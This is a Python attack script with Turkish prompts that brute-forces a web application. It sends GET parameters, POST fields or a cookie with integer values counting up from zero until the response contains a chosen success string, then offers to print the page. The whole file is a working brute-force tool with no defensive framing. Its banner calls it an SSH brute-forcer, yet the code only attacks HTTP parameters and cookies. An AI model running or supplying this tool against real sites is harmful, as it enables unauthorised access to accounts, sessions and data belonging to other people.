import urllib.parse
import urllib.request

def welcome_msg():
    print('|-------------------------------------------------------|')
    print('|          SSH-BRUTE-FORCE   A R A C I N A   H O Ş G E L D İ N İ Z          |')
    print('|                   yapan: enesdq                |')
    print('|-------------------------------------------------------|')

def prompt(msg, error_msg):
    while True:
        user_input = input(f'{msg}: ')
        if not user_input.strip():
            print(f'HATA: {error_msg}!')
        else:
            return user_input.lower()

def get_attack(url, success_string):
    param_name = prompt('Lütfen GET parametresinin adını girin', 'Boş bir ad girilemez')
    print('[+] Saldırı başlatıldı!')
    n = 0
    while True:
        print(f'[+] Deneniyor {param_name} = {n}')
        full_url = f"{url}?{urllib.parse.urlencode({param_name: n})}"
        response = urllib.request.urlopen(full_url).read().decode('utf-8')
        if success_string.lower() in response.lower():
            print(f'[+] Saldırı başarılı! Başarı mesajı {param_name} = {n} olduğunda bulundu.')
            if prompt('Cevabı burada yazdıralım mı? (Evet / Hayır)', 'A') == 'evet':
                print('\n## CEVAP ##\n\n' + response)
            break
        n += 1

def post_attack(url, success_string):
    param_name = prompt('Lütfen POST parametresinin adını girin', 'Boş bir ad girilemez')
    print('[+] Saldırı başlatıldı!')
    n = 0
    while True:
        print(f'[+] Deneniyor {param_name} = {n}')
        data = urllib.parse.urlencode({param_name: n}).encode('utf-8')
        req = urllib.request.Request(url, data=data)
        response = urllib.request.urlopen(req).read().decode('utf-8')
        if success_string.lower() in response.lower():
            print(f'[+] Saldırı başarılı! Başarı mesajı {param_name} = {n} olduğunda bulundu.')
            if prompt('Cevabı burada yazdıralım mı? (Evet / Hayır)', 'A') == 'evet':
                print('\n## CEVAP ##\n\n' + response)
            break
        n += 1

def cookie_attack(url, success_string):
    cookie_name = prompt('Lütfen Çerez adını girin', 'Boş bir çerez adı girilemez')
    print('[+] Saldırı başlatıldı!')
    n = 0
    while True:
        print(f'[+] Deneniyor {cookie_name} = {n}')
        opener = urllib.request.build_opener()
        opener.addheaders.append(('Cookie', f'{cookie_name}={n}'))
        response = opener.open(url).read().decode('utf-8')
        if success_string.lower() in response.lower():
            print(f'[+] Saldırı başarılı! Başarı mesajı {cookie_name} = {n} olduğunda bulundu.')
            if prompt('Cevabı burada yazdıralım mı? (Evet / Hayır)', 'A') == 'evet':
                print('\n## CEVAP ##\n\n' + response)
            break
        n += 1

def get_options():
    url = prompt('Lütfen URL\'yi girin (gerekliyse bir eğik çizgiyle bitirin)', 'Boş URL\'ler girilemez')
    success_string = prompt('Lütfen başarı mesajını girin', 'Boş başarı mesajları girilemez')
    while True:
        vector = input('Lütfen bir saldırı vektörü seçin (GET, POST, COOKIE): ').lower()
        if vector == 'get':
            get_attack(url, success_string)
            break
        elif vector == 'post':
            post_attack(url, success_string)
            break
        elif vector == 'cookie':
            cookie_attack(url, success_string)
            break
        else:
            print('HATA: Geçersiz saldırı vektörü!')

def main():
    welcome_msg()
    get_options()
    print('\n## Betik Sonlandı ##')

if __name__ == '__main__':
    main()
